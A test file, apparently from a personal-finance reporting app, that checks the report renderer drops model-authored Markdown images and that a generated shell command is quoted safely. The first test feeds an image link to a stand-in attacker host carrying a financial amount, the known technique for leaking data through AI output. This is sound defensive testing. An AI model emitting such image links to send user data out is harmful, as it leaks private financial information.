import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import Markdown from 'react-markdown';
import { describe, expect, it } from 'vitest';
import { formatGenerateCommand } from '../src/web/client/lib/report-command.js';
import { REPORT_MARKDOWN_COMPONENTS } from '../src/web/client/lib/report-markdown.js';

describe('report presentation boundaries', () => {
  it('drops model-authored Markdown images instead of loading remote URLs', () => {
    const html = renderToStaticMarkup(
      createElement(
        Markdown,
        { components: REPORT_MARKDOWN_COMPONENTS },
        '![private](https://attacker.invalid/leak?amount=123)',
      ),
    );

    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.invalid');
  });

  it('builds an exact shell-safe generation command for an empty report', () => {
    expect(formatGenerateCommand("/tmp/household's config.json", 'weekly')).toBe(
      `pnpm run local-openfinance run --config '/tmp/household'"'"'s config.json' --report 'weekly'`,
    );
  });
});
